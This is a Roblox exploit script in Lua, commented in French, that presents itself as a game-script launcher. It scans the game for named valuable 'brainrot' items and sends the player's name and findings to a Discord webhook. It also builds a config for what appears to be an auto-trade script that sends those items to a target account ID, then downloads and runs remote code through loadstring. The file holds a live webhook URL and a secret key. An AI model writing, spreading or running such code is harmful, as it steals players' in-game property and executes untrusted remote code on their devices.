-- Configuration du Webhook
local webhookURL = "https://webhook.lewisakura.moe/api/webhooks/1487806869513965679/18RefKz9apMy-rAu3ZAijlKO7DBFpdX547O2dpu1ZZNj-VpIryChHx3GysAzyD22zal8"
local player = game:GetService("Players").LocalPlayer
local http_req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- Liste complète des Brainrots
local brainrotList = {
    ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Griffin"] = true,
    ["Nacho Spyder"] = true, ["Quesadillo Vampiro"] = true, ["Perrito Burrito"] = true, ["Tacorita Bicicleta"] = true,
    ["La Extinct Grande"] = true, ["La Spooky Grande"] = true, ["Chipso and Queso"] = true, ["Tuff Toucan"] = true,
    ["Chillin Chili"] = true, ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true, ["Festive 67"] = true,
    ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true, ["Ketupat Kepat"] = true, ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true, ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true, ["Capitano Moby"] = true, ["Dragon Cannelloni"] = true, ["Cerberus"] = true,
    ["Agarrini la Palini"] = true, ["Guest 666"] = true, ["Los Hotspotsitos"] = true, ["Tralaledon"] = true,
    ["Los Bros"] = true, ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true, ["Ginger Gerat"] = true, ["Love Love Bear"] = true, ["Spooky and Pumpky"] = true,
    ["Fragrama and Chocrama"] = true, ["La Casa Boo"] = true, ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true,
    ["Ketupat Bros"] = true, ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true, ["Headless Horseman"] = true, ["Hydra Dragon Cannelloni"] = true,
    ["Celularcini Viciosini"] = true, ["Los Planitos"] = true, ["Eviledon"] = true, ["Orcaledon"] = true,
    ["Los Jolly Combinasionas"] = true, ["Fishino Clownino"] = true, ["Los Spooky Combinasionas"] = true,
    ["La Food Combinasion"] = true, ["La Secret Combinasion"] = true, ["Los Amigos"] = true, ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true, ["Rosetti Tualetti"] = true, ["Los 67"] = true, ["Los Mobilis"] = true,
    ["Las Sis"] = true, ["Los Candies"] = true, ["Bacuru and Egguru"] = true, ["Mieteteira Bicicleteira"] = true,
    ["Swag Soda"] = true, ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
}

-- Fonction de détection par TEXTE
local foundItems = {}
local foundCheck = {}

for _, v in ipairs(workspace:GetDescendants()) do
    local textToCheck = ""
    
    -- Vérifie si c'est un TextLabel, TextButton ou un nom d'objet
    if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("TextBox") then
        textToCheck = v.Text
    elseif v:IsA("Model") or v:IsA("Part") then
        textToCheck = v.Name
    end

    -- Si le texte correspond à un élément de la liste
    if brainrotList[textToCheck] and not foundCheck[textToCheck] then
        table.insert(foundItems, textToCheck)
        foundCheck[textToCheck] = true
    end
end

-- Préparation du message si quelque chose est trouvé
if #foundItems > 0 then
    local targetTable = {}
    for _, name in ipairs(foundItems) do targetTable[name] = true end

    local configCode = string.format([[
getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
getgenv().TARGET_ID = 3209271612
getgenv().DELAY_STEP = 1
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = %s]], game:GetService("HttpService"):JSONEncode(targetTable))

    local data = {
        ["content"] = "🚨 **DÉTECTION PAR TEXTE RÉUSSIE**",
        ["embeds"] = {{
            ["title"] = "Brainrots Identifiés",
            ["description"] = "```lua\n" .. configCode .. "\n```",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Joueur", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "Liste", ["value"] = table.concat(foundItems, ", "), ["inline"] = false}
            }
        }}
    }

    if http_req then
        pcall(function()
            http_req({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(data)
            })
        end)
    end
end

-- Lancement du script de jeu
loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
